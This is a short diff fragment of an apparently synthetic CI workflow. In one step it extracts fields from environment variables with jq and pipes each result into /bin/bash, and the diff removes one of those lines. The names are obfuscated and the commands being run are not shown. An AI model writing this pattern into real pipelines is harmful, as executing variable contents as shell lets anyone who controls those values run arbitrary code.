@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$qc9" | jq -r .qwno8 | /bin/bash
           echo $x37 | jq -r .uswm4 | /bin/bash
-          printf '%s' "$ktkw2" | jq -r .h70 | /bin/bash
           printf '%s' "$la8" | jq -r .zaw46 | /bin/bash
 
       - name: Archive output
